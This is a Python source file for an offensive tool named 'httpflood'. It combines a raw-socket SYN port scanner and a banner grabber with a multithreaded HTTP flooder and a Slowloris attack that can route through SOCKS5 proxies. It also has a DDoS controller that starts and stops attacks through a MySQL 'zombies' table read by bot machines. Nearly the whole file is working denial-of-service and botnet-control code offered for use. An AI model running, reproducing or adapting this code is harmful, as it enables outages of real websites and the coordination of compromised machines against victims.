# -*- coding: utf-8 -*-
from gevent import monkey
monkey.patch_all()
from gevent.pool import Pool
import sys, os, random, time, socket, argparse, errno, struct, threading, ssl
import pymysql, requests

# versioning
VERSION = (1, 1, 0)
__version__ = '%d.%d.%d' % VERSION[0:3]

# if python ver < 3.5
if sys.version_info[0:2] < (3, 5):
    raise RuntimeError('[-]Python 3.5 or higher is required!')

def get_host_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        hostip = s.getsockname()[0]

    except Exception:
        hostip = "localhost"
    finally:
        s.close()

    return hostip

def headerOfmain():
    print('''\
          _   _   _         __ _              _ 
         | |_| |_| |_ _ __ / _| |___  ___  __| |
         | ' \  _|  _| '_ \  _| / _ \/ _ \/ _` |
         |_||_\__|\__| .__/_| |_\___/\___/\__,_|
                     |_|    
                           By SuPer.Jz                    

        ''')


class Logger:
    def __init__(self, filename):
        self.terminal = sys.stdout
        self.filename = filename
        self.log = open(filename, "a")
        self.log.write("Log of " + time.ctime())

    def write(self, message):
        self.terminal.write(message)
        self.log.write(message)

    def flush(self):
        pass


# Port Numbers Extractor
def port_extraction(port):
    storeport = []
    # Verifiying Port Value
    if port:
        try:
            for i in port:
                if "-" in i:
                    ranges = i.split("-")
                    if "," in ranges[1]:
                        ranges = range(int(ranges[0]), int(ranges[1][:-1]) + 1)
                    else:
                        ranges = range(int(ranges[0]), int(ranges[1]) + 1)

                    storeport.extend(list(ranges))
                elif "," in i:
                    storeport.append(int(i[:-1]))
                else:
                    storeport.append(int(i))
        except ValueError:
            print("Space between comma!")
            exit(0)

    else:
        print("[*] Please Provide Ports For Scanning.")
        sys.exit(0)

    tmp = set(storeport)
    tmplist = list(tmp)
    tmplist.sort()
    return tmplist

# Checking About User Input Data is IP Or Host
def valid_ip(ip):
    '''Verifying IP Address'''
    try:
        socket.inet_aton(ip)
    except socket.error:
        ip = socket.gethostbyname(ip)
    return ip

class PortScanner():
    def __init__(self, target, allRanges, coroutines):
        self.dest_ip = target
        self.source_ip = get_host_ip()
        self.coroutines = coroutines
        self.allRanges = allRanges
        self.openPort = set()

    def __checksum(self, msg):
        ''' Check Summing '''

        s = 0
        for i in range(0, len(msg), 2):
            w = (msg[i] << 8) + msg[i + 1]
            s = s + w

        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff

        return s

    def __CreateSocket(self, source_ip, dest_ip):
        ''' create socket connection '''

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except socket.error as  msg:
            print ('Socket create error: ', str(msg[0]), 'message: ', msg[1])
            sys.exit()

        ''' Set the IP header manually '''

        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        s.settimeout(args.timeout)
        return s

    def __CreateIpHeader(self, source_ip, dest_ip):
        ''' create ip header '''

        # packet = ''

        # ip header option

        headerlen = 5
        version = 4
        tos = 0
        tot_len = 20 + 20
        id = random.randrange(18000, 65535, 1)
        frag_off = 0
        ttl = 255
        protocol = socket.IPPROTO_TCP
        check = 10
        saddr = socket.inet_aton(source_ip)
        daddr = socket.inet_aton(dest_ip)
        hl_version = (version << 4) + headerlen
        ip_header = struct.pack('!BBHHHBBH4s4s', hl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)

        return ip_header

    def __create_tcp_syn_header(self, source_ip, dest_ip, dest_port):
        ''' create tcp syn header function '''

        source = random.randrange(32000, 62000, 1)  # randon select one source_port
        seq = 0
        ack_seq = 0
        doff = 5

        ''' tcp flags '''
        fin = 0
        syn = 1
        rst = 0
        psh = 0
        ack = 0
        urg = 0
        window = socket.htons(8192)  # max windows size
        check = 0
        urg_ptr = 0
        offset_res = (doff << 4) + 0
        tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
        tcp_header = struct.pack('!HHLLBBHHH', source, dest_port, seq, ack_seq, offset_res, tcp_flags, window, check, urg_ptr)

        ''' headers option '''
        source_address = socket.inet_aton(source_ip)
        dest_address = socket.inet_aton(dest_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        psh = struct.pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length);
        psh = psh + tcp_header;
        tcp_checksum = self.__checksum(psh)

        ''' Repack the TCP header and fill in the correct checksum '''
        tcp_header = struct.pack('!HHLLBBHHH', source, dest_port, seq, ack_seq, offset_res, tcp_flags, window, tcp_checksum,
                          urg_ptr)

        return tcp_header

    def SynScan(self, des_port):
        s = self.__CreateSocket(self.source_ip, self.dest_ip)
        ip_header = self.__CreateIpHeader(self.source_ip, self.dest_ip)
        tcp_header = self.__create_tcp_syn_header(self.source_ip, self.dest_ip, des_port)
        packet = ip_header + tcp_header
        try:
            s.sendto(packet, (self.dest_ip, 0))
            data = s.recvfrom(1024)[0][0:]
            ip_header_len = (data[0] & 0x0f) * 4
            # ip_header_ret = data[0: ip_header_len]
            tcp_header_len = (data[32] & 0xf0) >> 2
            tcp_header_ret = data[ip_header_len:ip_header_len + tcp_header_len - 1]
            ''' SYN/ACK flags '''
            if tcp_header_ret[13] == 0x12:
                sport = (tcp_header_ret[0] << 8) + tcp_header_ret[1]
                self.openPort.add(sport)
            s.close()
        except socket.timeout:
            pass

    def scan(self, port):
        print("scanning " + str(port))
        s = socket.socket()
        s.settimeout(args.timeout)
        if s.connect_ex((self.dest_ip, port)) == 0:
            self.openPort.add(port)
            #print("Port %s Open" % str(port))
        s.close()

    def startScan(self):
        print("[*]Starting Port Scan")
        starttime = time.time()

        pool = Pool(self.coroutines)
        pool.map(self.scan, self.allRanges)
        pool.join()

        closetime = time.time()

        tmplist = list(self.openPort)
        tmplist.sort()
        for i in tmplist:
            print("[+]Port %s Open" % i)

        print("[+] Scan Started On ", time.ctime(starttime))
        print("[+] Scan Finished On", time.ctime(closetime))
        print('[+] Total Time Taken ', end=" ")
        print(round(closetime - starttime, 2), ' Seconds ')

        return list(self.openPort)

# Banner Grabbing Class
class BannerGrabber():
    def __init__(self, host, output):
        self.host = host
        self.output = output
        self.banners = dict()
        self.iter_address()

        # iter All Address

    def iter_address(self):
        # iter Host Iterms
        for address, port in self.host.items():
            self.start_threading(address, port)

        print("\n\n", '*' * 50, '\n')

        for i in sorted(self.banners):
            bann = self.banners[i]
            if type(bann) == type('1'):
                bann = bytes(bann, "utf-8")

            if b"FTP" in bann:
                print("Port:%s|Service：%s" % (i, "FTP"))
            elif b"SSH" in bann:
                print("Port:%s|Service：%s" % (i, "SSH"))
            elif b"\xff\xfd\x18" in bann:
                print("Port:%s|Service：%s" % (i, "Telnet"))
            elif b"SMTP" in bann:
                print("Port:%s|Service：%s" % (i, "SMTP"))
            elif b"HTTP" in bann:
                print("Port:%s|Service：%s" % (i, "HTTP"))
            elif b"irc" in bann:
                print("Port:%s|Service：%s" % (i, "irc"))
            else:
                print("Port:%s|Service：%s" % (i, bann))

        # Start threadings

    def start_threading(self, address, port):
        listthread = []
        for i in port:
            storethread = threading.Thread(target=self.banner_ip, args=(address, i,))
            storethread.start()
            listthread.append(storethread)

        # Wait For All Threads
        for i in listthread:
            i.join()

        # Banner Grabbing Functions

    def banner_ip(self, address, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(args.timeout)
        try:
            s.connect((address, int(port)))

            # Send some data to remote server
            message = b"GET / HTTP/1.1\r\n\r\n"
            if args.verbosity > 0:
                print("Grabbing banner on port %s" % port)
            s.sendall(message)
            # Now receive data
            self.banners[port] = s.recv(4096)
        except socket.error as e:
            if e.errno == errno.ECONNREFUSED:
                pass
            else:
                self.banners[port] = str(e)
        s.close()
        return

class HTTPFlooder():
    def __init__(self):
        #self.proxy_file = 'files/proxy.txt'
        self.ua_file = 'files/user-agents.txt'
        self.ref_file = 'files/referers.txt'
        self.ref = []
        self.ua = []
        self.parseFiles()
        self.ex = threading.Event()

    def parseFiles(self):
        # trying to find and parse file with User-Agents
        try:
            if os.stat(self.ua_file).st_size > 0:
                with open(self.ua_file) as user_agents:
                    self.ua = [row.rstrip() for row in user_agents]
            else:
                print('[-]Error: File %s is empty' % self.ua_file)
                sys.exit()
        except OSError:
            print('[-]Error: %s was not found!' % self.ua_file)
            sys.exit()

        # trying to find and parse file with referers
        try:
            if os.stat(self.ref_file).st_size > 0:
                with open(self.ref_file) as referers:
                    self.ref = [row.rstrip() for row in referers]
            else:
                print('[-]Error: File %s is empty!' % self.ref_file)
                sys.exit()
        except OSError:
            print('[-]Error: %s was not found!' % self.ref_file)
            sys.exit()
        # parse end

        # messaging statistics
        if args.verbosity > 0:
            print('[+]Loaded: {} user-agents, {} referers'.format(len(self.ua), len(self.ref)))

    def request(self):
        err_count = 0
        while not self.ex.is_set():
            timestamp = str(int(time.time()))
            headers = {'User-Agent': random.choice(self.ua),
                       'Referer': random.choice(self.ref) + args.target,
                       'Accept-Encoding': 'gzip;q=0,deflate,sdch',
                       'Cache-Control': 'no-cache, no-store, must-revalidate',
                       'Pragma': 'no-cache'}

            proxy = None

            try:
                if args.verbosity > 0:
                    print("[+] HTTP packet sent")

                if args.auth:
                    from requests.auth import HTTPBasicAuth
                    r = requests.get(args.target + '?' + timestamp, headers=headers, proxies=proxy, timeout=args.timeout,
                                     auth=HTTPBasicAuth(auth_login, auth_pass))
                else:
                    # request = requests.Request(url, data, headers)
                    # urllib.request.urlopen(request)
                    r = requests.get(args.target + '?' + timestamp, headers=headers, proxies=proxy, timeout=args.timeout)
                    #time.sleep(1)
                    # r= requests.post(url, headers=headers, proxies=proxy, timeout=args.timeout, data=data)
                if r.status_code == 301 or r.status_code == 302 or r.status_code == 307:
                    url = r.headers['Location']
                    print('[!]Request was redirected to {}'.format(url))
                time.sleep(1)

            except requests.exceptions.ChunkedEncodingError:
                pass
            except requests.exceptions.ConnectionError:
                err_count += 1
            except requests.exceptions.ReadTimeout:
                pass

            if err_count >= 20:
                print("[+]Target Down or IP banned")

    # Creating a thread pool
    def startAttack(self):
        threads = []
        for thread in range(args.threads):
            t = threading.Thread(target=self.request)
            t.daemon = True
            t.start()
            threads.append(t)

        try:
            while True:
                time.sleep(.05)
        except KeyboardInterrupt:
            self.ex.set()
            print(
                '\r[+]Attack has been stopped!\nGive up to ' + str(args.timeout) + ' seconds to release the threads...')
            for t in threads:
                t.join()

    def Slowloris(self):
        if args.proxy:
            try:
                import socks
                proxyip = args.proxy[0]
                proxyport = args.proxy[1]
                socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, proxyip, proxyport)
                socket.socket = socks.socksocket
                print("[*]Using SOCKS5 proxy for connecting...")
            except ImportError:
                print("[*]Socks Proxy Library Not Available!")
                exit(0)

        list_of_sockets = []
        socket_count = args.sockets
        print("[*]Attacking %s with %s sockets." % (args.target, socket_count))
        print("[*]Creating sockets...")
        for _ in range(socket_count):
            try:
                print("[*]Creating %s socket" % _)
                s = self.init_socket_forslow(args.target)
            except socket.error:
                break
            list_of_sockets.append(s)

        while True:
            try:
                print("[*]Sending keep-alive headers... Socket count: %s" % len(list_of_sockets))
                for s in list(list_of_sockets):
                    try:
                        s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                    except socket.error:
                        list_of_sockets.remove(s)

                for _ in range(socket_count - len(list_of_sockets)):
                    print("[!]Recreating socket...")
                    try:
                        s = self.init_socket_forslow(args.target)
                        if s:
                            list_of_sockets.append(s)
                    except socket.error:
                        break
                time.sleep(15)

            except (KeyboardInterrupt, SystemExit):
                print("\n[+]Stopping Slowloris...")
                break

    def init_socket_forslow(self, ip):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        if args.https:
            s = ssl.wrap_socket(s)

        s.connect((ip, int(args.port[0])))

        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
        s.send("User-Agent: {}\r\n".format(random.choice(self.ua)).encode("utf-8"))
        s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
        return s

    def initTable(self, host, user, passwd):
        conn = pymysql.connect(host=host, user=user, passwd=passwd)
        cursor = conn.cursor()
        cursor.execute("""create database if not exists zombies """)
        cursor.execute("""use zombies """)
        # cursor.execute("""drop table zombie""")
        cursor.execute("""create table if not exists  zombie(id int AUTO_INCREMENT , ip varchar(20), 
                          target varchar(100)  ,attack int default 0 , threads int default 4000, primary key(id)) """)

        cursor.close()
        conn.commit()
        conn.close()

    def startDDos(self ,host ,user, passwd):
        db = pymysql.connect(host=host, user=user,
                             password=passwd, db="zombies", port=3306)
        cursor = db.cursor()
        uodatesql = "update  zombie  set target = \"" + args.target + "\";"
        uodatesql2 = "update zombie set attack = 1 ;"

        try:
            cursor.execute(uodatesql)
            cursor.execute(uodatesql2)
            db.commit()
        except Warning as e:
            print(e)
        except Exception as e:
            db.rollback()
            raise e
        finally:
            db.close()

    def stopDDos(self, host, user, passwd):
        db = pymysql.connect(host=host, user=user,
                             password=passwd, db="zombies", port=3306)
        cursor = db.cursor()
        #uodatesql = "update  zombie  set target = \"" + args.target + "\";"
        uodatesql2 = "update zombie set attack = 0 ;"

        try:
            #cursor.execute(uodatesql)
            cursor.execute(uodatesql2)
            db.commit()
        except Exception as e:
            db.rollback()
            raise e
        finally:
            db.close()

    def DDos(self, host ,user, passwd, port):
        print("Initing Database...")
        self.initTable(host=host, user=user, passwd=passwd)
        while True:
            print("Start or Stop? (exit to quit)")
            choice = input()
            if choice.lower() == "start":
                self.startDDos(host ,user, passwd)
            elif choice.lower() == "stop":
                self.stopDDos(host ,user, passwd)
            elif choice.lower() == "quit":
                exit(0)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        # description=textwrap.dedent('''\
        description=("HTTP Flood Tool made By SuPer.Jz(zhe6652)"),
        epilog="if you have any problem, Contact me at zhe6652@gmail.com")

    parser.add_argument("-S", "--SynScan",
                        help="Perform a TCP SYN scan to target", action="store_true")

    parser.add_argument("-H", help="Perform a Service scan to target", action="store_true")

    parser.add_argument('target', help="the target you want to attack  e.g. http://192.168.1.1:8080/test.jpg")
    parser.add_argument('-T', '--threads', help="how many threads do you want ", type=int, default=100)



    parser.add_argument('-a', "--auth", help="authentication if http/https needs e.g. <zhe6652 password.>", nargs=2)
    parser.add_argument('-t', "--timeout", help="timeout for connection",
                        type=float, default=2)

    parser.add_argument("-p", "--port",
                        help="Specify Target Ports Seperated by commas or Provide Range of Ports. eg. 80-1200",
                        nargs='*')

    parser.add_argument("--verbosity", help="increase output verbosity", type=int, choices=[1, 2, 3], default=0)
    parser.add_argument("--version", help="print(current version info", action="version", version=__version__)

    parser.add_argument('-o', "--output", dest="output", help="Specify Path For Saving Output in Txt.",
                        default=None)

    parser.add_argument('--slowloris', action="store_true", help="Use Slowloris for attack")
    parser.add_argument("--https", help="Use https for Slowloris", action="store_true",
                        )

    parser.add_argument('-s', '--sockets', default=500, help="Number of sockets to use in Slowloris", type=int)
    parser.add_argument('-P', '--proxy',
                        help="enable proxy mode for slowloris(socks)", nargs=2)
    parser.add_argument('-D', '--DDos',
                        help="DDos options for attacking e.g. user=xxx host=xxx  port=xxx passwd=xxx", nargs='*')


    args = parser.parse_args()
    headerOfmain()
    # DDOS()
    #startDDos()
    if args.output:
        sys.stdout = Logger(args.output)

    if args.SynScan:
        ports = port_extraction(args.port)
        scan = PortScanner(args.target, ports, args.threads)
        scan.startScan()

    if args.H:
        host = {}
        ports = port_extraction(args.port)
        #host[args.target] = ports
        host[valid_ip(args.target)] = ports
        for h, p in host.items():
            print("[*] IP Address Detected : {} | Num. Of Port Input : {}".format(h, len(p)))

        scan = PortScanner(args.target, ports, args.threads)
        openPorts = scan.startScan()
        print("[*] Open Ports Verified.\n[+] IP : {} | Ports : {}".format(args.target, openPorts))
        openhost = dict()
        openhost[args.target] = openPorts
        #print(host)
        BannerGrabber(openhost, args.output)

    if args.slowloris:
        sl = HTTPFlooder()
        sl.Slowloris()

    if args.DDos:
        vardict = {}
        for item in args.DDos:
            i = item.split("=")
            vardict[i[0]] = i[1]

        user = vardict["user"]
        passwd = vardict["passwd"]
        port = vardict["port"]
        host = vardict["host"]

        ddos=HTTPFlooder()
        ddos.DDos(host ,user, passwd, port)

    if not (args.SynScan or args.H or args.slowloris):
        if args.auth:
            global auth_login
            global auth_pass
            auth_login = args.auth[0]
            auth_pass = args.auth[1]

        fd = HTTPFlooder()
        print('[+]Start sending requests...')
        fd.startAttack()
